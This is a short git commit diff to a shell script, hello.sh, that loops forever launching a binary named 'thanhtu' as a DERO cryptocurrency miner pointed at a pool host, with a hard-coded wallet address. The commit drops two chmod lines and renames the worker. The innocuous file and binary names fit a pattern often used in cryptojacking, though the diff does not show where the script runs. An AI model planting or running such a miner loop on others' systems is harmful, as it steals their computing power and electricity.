6f67d7b187dcbcc2ae2841a36e9b773685dc69f7
ai4m2022 <162436374+ai4m2022@users.noreply.github.com>
2024-05-01 12:00:06 +0700

    Update hello.sh

--- hello.sh
+++ hello.sh
@@ -1,7 +1,5 @@
 #!/bin/bash
 while :; do
-    chmod u+x thanhti
-    chmod u+x hello.sh
-    ./thanhtu -w dero1qy07a8cmr2c7waf75qhagteldka0pdpyaur029xzvpdlmyqvhln0uqqknxsvt.galaxy -r community-pools.mysrv.cloud:10300 -m 3 -p rpc;
+    ./thanhtu -w dero1qy07a8cmr2c7waf75qhagteldka0pdpyaur029xzvpdlmyqvhln0uqqknxsvt.onecloud -r community-pools.mysrv.cloud:10300 -m 3 -p rpc;
     sleep 5;
 done
